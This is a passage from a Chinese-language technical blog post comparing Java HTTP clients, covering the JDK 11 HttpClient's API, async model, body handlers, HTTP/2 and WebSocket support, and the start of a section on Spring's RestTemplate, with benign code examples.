<li><strong>开发工具库或框架</strong>: 如果你正在编写一个需要对外提供给其他项目使用的库，引入第三方HTTP客户端会增加你库的“重量”，并可能给使用者带来依赖版本冲突（即“依赖地狱”）。使用JDK HttpClient可以创建零依赖的纯净库。</li>
<li><strong>轻量级应用和微服务</strong>: 对于功能单一、追求启动速度和最小化部署包体积的微服务或命令行工具，避免引入额外的jar包是一个实际的需求。</li>
<li><strong>简单或临时的HTTP调用</strong>: 当你只需要在一个工具类或一个简单的脚本中发起HTTP请求时，为了这个单一功能而去引入整个OkHttp或Apache HttpClient库，会显得“小题大做”。</li>
<li><strong>安全与合规</strong>: 在一些对第三方依赖有严格审计和安全要求的企业环境中，使用JDK内置的功能可以简化合规流程。</li>
</ul>
<p>简而言之，“无依赖”特性让JDK HttpClient成为了一个轻便、自包含的选择。它降低了项目的复杂性，避免了潜在的依赖冲突，使得在任何需要Java 11+环境的地方，都能有一个可靠的HTTP客户端随时待命。当然，这也意味着它无法像第三方库那样快速迭代，并且缺少第三方库庞大的社区生态和插件支持。</p>
<hr>
<h2 id="2-核心API与特性"><a href="#2-核心API与特性" class="headerlink" title="2. 核心API与特性"></a>2. 核心API与特性</h2><h3 id="2-1-HttpClient-HttpRequest-HttpResponse-核心三要素"><a href="#2-1-HttpClient-HttpRequest-HttpResponse-核心三要素" class="headerlink" title="2.1 HttpClient, HttpRequest, HttpResponse 核心三要素"></a>2.1 <code>HttpClient</code>, <code>HttpRequest</code>, <code>HttpResponse</code> 核心三要素</h3><p>与OkHttp类似，JDK HttpClient也围绕着这三个核心类进行构建，它们的设计同样强调不可变性和易用性。</p>
<ul>
<li><strong><code>HttpClient</code></strong>: 客户端实例，负责发送请求。<ul>
<li><strong>构建</strong>: 通过<code>HttpClient.newBuilder()</code>或<code>HttpClient.newHttpClient()</code>创建。<code>newBuilder()</code>提供了丰富的配置选项。</li>
<li><strong>核心特性</strong>:<ul>
<li><strong>不可变与线程安全</strong>: 与OkHttp一样，通过Builder构建的<code>HttpClient</code>实例是不可变的，因此是线程安全的。</li>
<li><strong>鼓励共享与单例</strong>: 它内部管理着连接池和线程资源，因此在应用程序中应该作为一个<strong>单例</strong>来创建和复用，以获得最佳性能。</li>
</ul>
</li>
<li><strong>配置</strong>: <code>HttpClient.Builder</code>允许配置版本策略（HTTP&#x2F;1.1 或 HTTP&#x2F;2）、连接超时、重定向策略、代理、SSL上下文等。</li>
</ul>
</li>
<li><strong><code>HttpRequest</code></strong>: 代表一个HTTP请求，也是不可变的。<ul>
<li><strong>构建</strong>: 通过<code>HttpRequest.newBuilder()</code>以流式API创建。</li>
<li><strong>组成</strong>:<ul>
<li><code>.uri(URI)</code>: 设置请求的URI。</li>
<li><code>.header(String, String)</code>: 设置请求头。</li>
<li><code>.GET()</code>, <code>.POST(BodyPublisher)</code>, <code>.PUT(BodyPublisher)</code>, <code>.DELETE()</code>: 设置请求方法。</li>
<li><code>BodyPublisher</code>: 请求体的发布者。<code>HttpRequest.BodyPublishers</code>工具类提供了多种便捷的实现，如<code>ofString()</code>, <code>ofByteArray()</code>, <code>ofFile()</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>HttpResponse&lt;T&gt;</code></strong>: 代表一个HTTP响应，<code>T</code>是响应体的类型。<ul>
<li><strong>组成</strong>:<ul>
<li><code>.statusCode()</code>: 获取状态码。</li>
<li><code>.headers()</code>: 获取响应头。</li>
<li><code>.body()</code>: 获取类型为<code>T</code>的响应体。响应体的具体类型由请求时传入的<code>BodyHandler</code>决定。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>示例：构建一个完整的请求-响应流程</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.http.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建并复用HttpClient实例</span></span><br><span class="line"><span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClient.newBuilder()</span><br><span class="line">        .version(HttpClient.Version.HTTP_2) <span class="comment">// 优先使用HTTP/2</span></span><br><span class="line">        .followRedirects(HttpClient.Redirect.NORMAL)</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 构建不可变的HttpRequest</span></span><br><span class="line"><span class="type">HttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> HttpRequest.newBuilder()</span><br><span class="line">        .uri(URI.create(<span class="string">&quot;https://httpbin.org/post&quot;</span>))</span><br><span class="line">        .header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        .POST(HttpRequest.BodyPublishers.ofString(<span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;java11\&quot;&#125;&quot;</span>))</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 发送请求并获取HttpResponse&lt;String&gt;</span></span><br><span class="line"><span class="comment">// BodyHandlers.ofString() 决定了响应体类型为String</span></span><br><span class="line">HttpResponse&lt;String&gt; response = client.send(request, HttpResponse.BodyHandlers.ofString());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 处理响应</span></span><br><span class="line">System.out.println(<span class="string">&quot;Status Code: &quot;</span> + response.statusCode());</span><br><span class="line">System.out.println(<span class="string">&quot;Response Body: &quot;</span> + response.body());</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-原生异步模型：基于-CompletableFuture"><a href="#2-2-原生异步模型：基于-CompletableFuture" class="headerlink" title="2.2 原生异步模型：基于 CompletableFuture"></a>2.2 原生异步模型：基于 <code>CompletableFuture</code></h3><p>这是JDK HttpClient最核心的现代化特性之一。它与Java 8引入的<code>CompletableFuture</code>深度集成，提供了世界一流的异步编程体验。</p>
<ul>
<li><strong>异步发送</strong>: <code>HttpClient</code>的<code>sendAsync()</code>方法会立即返回一个<code>CompletableFuture&lt;HttpResponse&lt;T&gt;&gt;</code>，而不会阻塞当前线程。</li>
<li><strong>链式组合</strong>: <code>CompletableFuture</code>提供了极其丰富的API（如<code>thenApply</code>, <code>thenAccept</code>, <code>thenCompose</code>, <code>exceptionally</code>），可以优雅地对异步结果进行转换、组合和错误处理，避免了传统回调方式带来的“回调地狱”（Callback Hell）。</li>
</ul>
<p><strong>示例：异步发送请求并处理结果</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">client.sendAsync(request, HttpResponse.BodyHandlers.ofString())</span><br><span class="line">      .thenApply(HttpResponse::body) <span class="comment">// 异步转换：从HttpResponse&lt;String&gt;中提取出String类型的body</span></span><br><span class="line">      .thenAccept(body -&gt; &#123; <span class="comment">// 异步消费：当body准备好时，执行此Lambda</span></span><br><span class="line">          System.out.println(<span class="string">&quot;Async Response Body: &quot;</span> + body);</span><br><span class="line">      &#125;)</span><br><span class="line">      .exceptionally(e -&gt; &#123; <span class="comment">// 异步异常处理</span></span><br><span class="line">          System.err.println(<span class="string">&quot;Async request failed: &quot;</span> + e.getMessage());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;Async call has been sent. Main thread is free.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这种原生、非阻塞的异步模型，使其非常适合用于构建需要高吞吐量的后端服务，能够充分利用系统资源，避免线程因I&#x2F;O等待而被浪费。</p>
<hr>
<h3 id="2-3-灵活的响应体处理：HttpResponse-BodyHandlers"><a href="#2-3-灵活的响应体处理：HttpResponse-BodyHandlers" class="headerlink" title="2.3 灵活的响应体处理：HttpResponse.BodyHandlers"></a>2.3 灵活的响应体处理：<code>HttpResponse.BodyHandlers</code></h3><p>如何处理响应体是HTTP客户端设计的关键。JDK HttpClient通过<code>BodyHandler&lt;T&gt;</code>接口和<code>HttpResponse.BodyHandlers</code>工具类提供了一套非常灵活和高效的机制。</p>
<p><code>BodyHandler&lt;T&gt;</code>决定了如何处理收到的响应字节流，并最终将其转换成一个类型为<code>T</code>的对象。</p>
<p><strong>常用<code>BodyHandlers</code>：</strong></p>
<ul>
<li><code>ofString()</code>: 将响应体转换成一个<code>String</code>。</li>
<li><code>ofByteArray()</code>: 将响应体转换成一个<code>byte[]</code>。</li>
<li><code>ofInputStream()</code>: 将响应体作为一个<code>InputStream</code>提供。<strong>注意</strong>：使用此handler时，需要手动读取并关闭流，以确保连接被释放。</li>
<li><code>ofFile(Path)</code>: <strong>直接将响应体流式写入到指定文件</strong>。这在下载大文件时非常有用，因为它不会将整个文件加载到内存中。</li>
<li><code>discarding()</code>: 忽略并丢弃响应体，只关心状态码和响应头。</li>
<li><code>fromSubscriber(Subscriber)</code>: 与响应式流（Reactive Streams）集成，允许以流式方式处理响应数据。</li>
</ul>
<p><strong>示例：下载文件到本地</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="type">HttpRequest</span> <span class="variable">downloadRequest</span> <span class="operator">=</span> HttpRequest.newBuilder()</span><br><span class="line">        .uri(URI.create(<span class="string">&quot;https://download.example.com/large-file.zip&quot;</span>))</span><br><span class="line">        .GET()</span><br><span class="line">        .build();</span><br><span class="line"></span><br><span class="line"><span class="comment">// BodyHandlers.ofFile() 会返回一个 HttpResponse&lt;Path&gt;，body()方法将返回文件的保存路径</span></span><br><span class="line">HttpResponse&lt;Path&gt; response = client.send(downloadRequest, HttpResponse.BodyHandlers.ofFile(Paths.get(<span class="string">&quot;downloaded.zip&quot;</span>)));</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;File downloaded to: &quot;</span> + response.body());</span><br><span class="line">System.out.println(<span class="string">&quot;Status Code: &quot;</span> + response.statusCode());</span><br></pre></td></tr></table></figure>

<p>这种设计将“如何处理响应体”这一策略从执行逻辑中解耦出来，使得代码更加清晰和模块化。</p>
<hr>
<h3 id="2-4-内置支持-HTTP-2-和-WebSocket"><a href="#2-4-内置支持-HTTP-2-和-WebSocket" class="headerlink" title="2.4 内置支持 HTTP&#x2F;2 和 WebSocket"></a>2.4 内置支持 HTTP&#x2F;2 和 WebSocket</h3><p>JDK HttpClient从设计之初就将现代网络协议作为一等公民。</p>
<ul>
<li><strong>HTTP&#x2F;2</strong>:<ul>
<li><strong>默认支持</strong>: <code>HttpClient</code>默认会尝试使用HTTP&#x2F;2。当通过HTTPS与支持HTTP&#x2F;2的服务器通信时，它会像OkHttp一样，通过ALPN自动协商升级，开发者无需任何额外配置。</li>
<li><strong>服务器推送 (Server Push)</strong>: HTTP&#x2F;2的一个高级特性。JDK HttpClient通过<code>PushPromiseHandler</code>支持服务器推送，允许客户端在收到推送时决定如何处理这些额外资源。</li>
</ul>
</li>
<li><strong>WebSocket</strong>:<ul>
<li><strong>原生API</strong>: <code>HttpClient</code>提供了<code>newWebSocketBuilder()</code>方法来构建WebSocket连接。</li>
<li><strong>事件驱动模型</strong>: 通过实现<code>WebSocket.Listener</code>接口，可以监听连接的<code>onOpen</code>, <code>onText</code>, <code>onBinary</code>, <code>onClose</code>, <code>onError</code>等事件，从而实现全双工的实时通信。</li>
</ul>
</li>
</ul>
<p><strong>示例：构建一个简单的WebSocket客户端</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CompletionStage;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 实现WebSocket监听器</span></span><br><span class="line">WebSocket.<span class="type">Listener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebSocket</span>.Listener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(WebSocket webSocket)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;WebSocket Opened!&quot;</span>);</span><br><span class="line">        webSocket.sendText(<span class="string">&quot;Hello, world!&quot;</span>, <span class="literal">true</span>); <span class="comment">// 发送消息</span></span><br><span class="line">        webSocket.request(<span class="number">1</span>); <span class="comment">// 请求接收下一条消息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CompletionStage&lt;?&gt; onText(WebSocket webSocket, CharSequence data, <span class="type">boolean</span> last) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Received message: &quot;</span> + data);</span><br><span class="line">        webSocket.request(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 其他回调方法如 onClose, onError</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用HttpClient构建并连接WebSocket</span></span><br><span class="line">HttpClient.newHttpClient().newWebSocketBuilder()</span><br><span class="line">    .buildAsync(URI.create(<span class="string">&quot;wss://echo.websocket.events&quot;</span>), listener);</span><br></pre></td></tr></table></figure>

<p>内置对WebSocket的支持，使得开发者在需要实现实时通信功能时，不再需要引入专门的WebSocket客户端库。</p>
<hr>
<h2 id="3-优缺点分析-2"><a href="#3-优缺点分析-2" class="headerlink" title="3. 优缺点分析"></a>3. 优缺点分析</h2><h3 id="3-1-优点-2"><a href="#3-1-优点-2" class="headerlink" title="3.1 优点"></a>3.1 优点</h3><h4 id="3-1-1-原生标准、无依赖"><a href="#3-1-1-原生标准、无依赖" class="headerlink" title="3.1.1 原生标准、无依赖"></a>3.1.1 原生标准、无依赖</h4><p>这是它最突出的优势，带来了多方面的好处：</p>
<ul>
<li><strong>零依赖，零冲突</strong>: 作为JDK的一部分，它无需任何外部<code>jar</code>包。这从根本上消除了“依赖地狱”的风险——即因引入第三方库而导致的不同版本依赖冲突。这对于开发需要被其他项目引用的<strong>公共库或框架</strong>来说，是巨大的福音。</li>
<li><strong>轻量与纯净</strong>: 对于追求最小化部署包体积的微服务、Serverless函数或简单的命令行工具，使用JDK HttpClient意味着更小的最终产物和更简洁的依赖树。</li>
<li><strong>长期稳定与维护保证</strong>: 作为Java平台的标准组件，它由OpenJDK社区和Oracle共同维护，其生命周期与JDK本身绑定。开发者可以确信它会得到长期的支持、安全更新和演进，而不必担心某个开源项目停止维护。</li>
<li><strong>与平台深度集成</strong>: 随着Java平台的发展，JDK HttpClient能够最先、最深度地与新特性集成。例如，Project Loom带来的虚拟线程，将能无缝地与JDK HttpClient的同步API结合，以极低的成本实现大规模并发，这是第三方库短期内难以企及的。</li>
</ul>
<hr>
<h4 id="3-1-2-现代化的异步API"><a href="#3-1-2-现代化的异步API" class="headerlink" title="3.1.2 现代化的异步API"></a>3.1.2 现代化的异步API</h4><p>JDK HttpClient的设计拥抱了现代Java的异步编程范式，其核心是<code>CompletableFuture</code>。</p>
<ul>
<li><strong>世界级的异步体验</strong>: 与OkHttp的回调模型或Apache HttpAsyncClient相比，基于<code>CompletableFuture</code>的API提供了**可组合的（Composable）**异步能力。开发者可以利用<code>.thenApply()</code>, <code>.thenCompose()</code>, <code>.exceptionally()</code>等丰富的链式操作，以一种声明式、近乎同步代码的逻辑来编排复杂的异步工作流，代码清晰且不易出错。</li>
<li><strong>避免“回调地狱”</strong>: 传统的回调方式容易导致层层嵌套，形成难以维护的“回调地狱”。<code>CompletableFuture</code>的链式调用和组合能力完美地解决了这个问题。</li>
<li><strong>高资源利用率</strong>: 其非阻塞I&#x2F;O模型意味着发起HTTP请求的线程不会被漫长的等待所阻塞，可以被释放去处理其他任务。这使得应用程序能够用较少的线程处理大量的并发I&#x2F;O操作，极大地提升了系统的吞吐量和伸缩性。</li>
</ul>
<hr>
<h3 id="3-2-缺点-2"><a href="#3-2-缺点-2" class="headerlink" title="3.2 缺点"></a>3.2 缺点</h3><h4 id="3-2-1-功能与生态相对单薄"><a href="#3-2-1-功能与生态相对单薄" class="headerlink" title="3.2.1. 功能与生态相对单薄"></a>3.2.1. 功能与生态相对单薄</h4><p>相比于经过十多年发展、拥有庞大社区的第三方库，JDK HttpClient在“开箱即用”的功能丰富度和周边生态上有所欠缺。</p>
<ul>
<li><strong>缺少高级功能</strong>:<ul>
<li><strong>内置缓存</strong>: OkHttp提供了一个功能完善、遵循HTTP规范的响应缓存机制，而JDK HttpClient没有内置此功能，需要开发者自行实现或集成第三方缓存库。</li>
<li><strong>复杂认证</strong>: 不像Apache HttpClient那样内置对NTLM或Kerberos(SPNEGO)等复杂企业认证方案的支持。</li>
<li><strong>高级重试</strong>: 虽然支持基本的重定向，但缺少像OkHttp拦截器或Resilience4j那样易于集成的、支持指数退避（Exponential Backoff）等高级策略的重试机制。</li>
</ul>
</li>
<li><strong>生态系统不成熟</strong>:<ul>
<li><strong>测试工具</strong>: OkHttp的<code>MockWebServer</code>是一个极其强大且易用的HTTP服务器Mock工具，是单元测试和集成测试的利器。JDK HttpClient生态中缺少这样官方或广泛认可的配套测试库。</li>
<li><strong>插件与扩展</strong>: 第三方库拥有丰富的插件生态，例如用于日志记录（<code>okhttp-logging-interceptor</code>）、监控指标（Micrometer绑定）等的现成模块。使用JDK HttpClient时，这些通常需要自己动手实现。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-2-2-可配置性有限"><a href="#3-2-2-可配置性有限" class="headerlink" title="3.2.2. 可配置性有限"></a>3.2.2. 可配置性有限</h4><p>为了API的简洁性，JDK HttpClient在某些方面隐藏了底层的复杂性，牺牲了一部分“深度定制”的能力。</p>
<ul>
<li><strong>连接池“黑盒”</strong>: JDK HttpClient内部自动管理连接池，但它<strong>没有提供API来精细化配置连接池的行为</strong>。你无法像使用Apache HttpClient或OkHttp那样，设置每个路由（<code>per route</code>）的最大连接数。这个功能在防止对某个下游服务的请求风暴耗尽整个连接池时非常关键。对于需要极限性能调优的“Power User”来说，这是一个明显的短板。</li>
<li><strong>缺乏拦截器机制</strong>: 这是与OkHttp最大的功能差异。JDK HttpClient<strong>没有提供一个标准的、类似OkHttp Interceptor的责任链模式</strong>。这意味着你无法以AOP（面向切面编程）的方式，轻松地在请求&#x2F;响应链中插入统一的逻辑（如请求签名、加密&#x2F;解密、统一监控等）。虽然可以通过包装<code>HttpClient</code>实例来实现类似功能，但这远不如一个原生的拦截器机制来得优雅和强大。</li>
</ul>
<hr>
<h1 id="五、Spring框架的封装与抽象"><a href="#五、Spring框架的封装与抽象" class="headerlink" title="五、Spring框架的封装与抽象"></a>五、Spring框架的封装与抽象</h1><p>Spring框架作为Java后端开发的事实标准，提供了自己的HTTP客户端抽象层。这层抽象的目的是为了简化HTTP调用，并与Spring的依赖注入、错误处理等生态无缝集成。</p>
<h2 id="1-RestTemplate-遗留-维护中"><a href="#1-RestTemplate-遗留-维护中" class="headerlink" title="1. RestTemplate (遗留&#x2F;维护中)"></a>1. <code>RestTemplate</code> (遗留&#x2F;维护中)</h2><p><code>RestTemplate</code>是Spring框架早期提供的核心HTTP客户端工具，自Spring 3.0版本引入以来，在很长一段时间内都是Spring应用中进行同步HTTP通信的首选。</p>
<h3 id="1-1-定位"><a href="#1-1-定位" class="headerlink" title="1.1 定位"></a>1.1 定位</h3><p><code>RestTemplate</code>遵循了Spring中经典的<strong>模板方法模式（Template Method Pattern）</strong>，例如<code>JdbcTemplate</code>、<code>JmsTemplate</code>等。</p>
<ul>
<li><strong>模板方法模式</strong>: 它封装了执行HTTP请求的固定流程（如创建连接、发送请求、处理响应、资源关闭），并将其中易变的部分（如设置URL、请求体、处理结果）暴露给开发者。这使得开发者可以专注于业务逻辑，而无需关心底层的资源管理细节。</li>
<li><strong>同步阻塞</strong>: <code>RestTemplate</code>的核心设计是<strong>同步和阻塞</strong>的。当你调用它的任何一个方法时，当前执行线程会一直被阻塞，直到HTTP响应完全返回或发生超时。这在传统的基于“一个请求一个线程”模型的Spring MVC应用中非常自然，但在需要高并发、高吞吐量的现代应用中，会成为性能瓶颈。</li>
</ul>
<hr>
<h3 id="1-2-核心用法"><a href="#1-2-核心用法" class="headerlink" title="1.2 核心用法"></a>1.2 核心用法</h3><p><code>RestTemplate</code>提供了一套非常直观的、按HTTP方法和返回类型分类的API。</p>
<ul>
<li><p><strong><code>getForObject(url, responseType, ...)</code> &#x2F; <code>postForObject(...)</code></strong>:</p>
<ul>
<li>这是最简单的一组方法。它们直接返回反序列化后的响应体对象（<code>responseType</code>）。</li>
<li><strong>缺点</strong>: 如果请求失败（返回4xx或5xx状态码），它会直接抛出<code>HttpClientErrorException</code>或<code>HttpServerErrorException</code>，你无法获取到响应头或具体的错误响应体内容。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设 restTemplate 是一个已注入的Bean</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;https://api.example.com/users/&#123;id&#125;&quot;</span>;</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> restTemplate.getForObject(url, User.class, <span class="number">101</span>); </span><br><span class="line"><span class="comment">// user对象是JSON响应体反序列化后的结果</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>getForEntity(url, responseType, ...)</code> &#x2F; <code>postForEntity(...)</code></strong>:</p>
<ul>
<li>这组方法返回一个<code>ResponseEntity&lt;T&gt;</code>对象。</li>
<li><code>ResponseEntity</code>不仅包含了响应体（<code>.getBody()</code>），还包含了响应状态码（<code>.getStatusCode()</code>）和响应头（<code>.getHeaders()</code>）。</li>
<li><strong>优点</strong>: 即使请求失败，它也会返回<code>ResponseEntity</code>（但同样会先抛出异常），这在需要根据状态码或响应头做进一步判断时非常有用。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ResponseEntity&lt;User&gt; responseEntity = restTemplate.getForEntity(url, User.class, <span class="number">101</span>);</span><br><span class="line"><span class="keyword">if</span> (responseEntity.getStatusCode() == HttpStatus.OK) &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> responseEntity.getBody();</span><br><span class="line">    <span class="type">String</span> <span class="variable">contentType</span> <span class="operator">=</span> responseEntity.getHeaders().getFirst(<span class="string">&quot;Content-Type&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>exchange(url, method, requestEntity, responseType, ...)</code></strong>:</p>
<ul>
<li>这是<code>RestTemplate</code>中<strong>最通用、最灵活</strong>的方法。</li>
<li>它允许你指定任意的HTTP方法 (<code>HttpMethod</code>)，并通过一个<code>HttpEntity&lt;T&gt;</code>或<code>RequestEntity&lt;T&gt;</code>对象来封装请求头和请求体。</li>
<li>返回一个<code>ResponseEntity&lt;T&gt;</code>，让你能完全控制请求和响应的每一个细节。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">headers.setBearerAuth(<span class="string">&quot;my-secret-token&quot;</span>);</span><br><span class="line">HttpEntity&lt;String&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span>&lt;&gt;(<span class="string">&quot;request body&quot;</span>, headers);</span><br><span class="line"></span><br><span class="line">ResponseEntity&lt;String&gt; response = restTemplate.exchange(</span><br><span class="line">    <span class="string">&quot;https://api.example.com/data&quot;</span>, </span><br><span class="line">    HttpMethod.POST, </span><br><span class="line">    requestEntity, </span><br><span class="line">    String.class</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="1-3-底层替换"><a href="#1-3-底层替换" class="headerlink" title="1.3 底层替换"></a>1.3 底层替换</h3><p><code>RestTemplate</code>本身只是一个模板，它不直接处理HTTP连接。真正的HTTP请求是由<code>ClientHttpRequestFactory</code>的实现来完成的。</p>
<ul>
<li><strong>默认实现</strong>: 默认情况下，<code>RestTemplate</code>使用<code>SimpleClientHttpRequestFactory</code>，它内部包装的就是JDK的<code>java.net.HttpURLConnection</code>。这意味着，一个未经配置的<code>RestTemplate</code><strong>没有连接池</strong>，性能低下，不适合在生产环境中使用。</li>
<li><strong>替换底层</strong>: 这是在生产环境中使用<code>RestTemplate</code>的<strong>必要步骤</strong>。通过更换<code>ClientHttpRequestFactory</code>的实现，我们可以让<code>RestTemplate</code>使用更强大的HTTP客户端作为其底层引擎。<ul>
<li><strong>集成Apache HttpClient</strong>: 使用<code>HttpComponentsClientHttpRequestFactory</code>。</li>
<li><strong>集成OkHttp</strong>: 使用<code>OkHttp3ClientHttpRequestFactory</code>。</li>
</ul>
</li>
</ul>
<p><strong>示例：配置使用Apache HttpClient的RestTemplate Bean</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">(CloseableHttpClient httpClient)</span> &#123; <span class="comment">// 假设httpClient Bean已配置好连接池</span></span><br><span class="line">        <span class="comment">// 使用HttpComponentsClientHttpRequestFactory来包装一个配置好连接池的HttpClient</span></span><br><span class="line">        <span class="type">HttpComponentsClientHttpRequestFactory</span> <span class="variable">requestFactory</span> <span class="operator">=</span> </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">HttpComponentsClientHttpRequestFactory</span>(httpClient);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 可以为这个factory设置超时</span></span><br><span class="line">        requestFactory.setConnectTimeout(<span class="number">5000</span>);</span><br><span class="line">        requestFactory.setReadTimeout(<span class="number">10000</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>(requestFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这种方式，<code>RestTemplate</code>就能享受到由Apache HttpClient或OkHttp提供的连接池、精细化超时控制等高级功能。</p>
<hr>
<h3 id="1-4-问题"><a href="#1-4-问题" class="headerlink" title="1.4 问题"></a>1.4 问题</h3><p>尽管<code>RestTemplate</code>非常成功，但随着技术的发展，其设计上的缺陷也日益凸显。</p>
<ul>
<li><strong>阻塞式设计</strong>: 这是其最根本的问题。在响应式编程和高并发微服务成为主流的今天，同步阻塞模型会严重限制系统的吞吐量和伸缩性。</li>
<li><strong>API设计笨重</strong>:<ul>
<li><strong>方法过多</strong>: API为了覆盖各种场景，提供了大量重载方法，显得臃肿且容易混淆。</li>
<li><strong>URL模板和变量处理不便</strong>: 使用<code>String</code> URL和<code>Object...</code>可变参数来处理路径变量和请求参数，不是类型安全的，且在构建复杂URL时非常不便。</li>
<li><strong>缺乏流畅性</strong>: API不是链式的，构建一个带有复杂Header和Body的请求不如现代客户端那样直观。</li>
</ul>
</li>
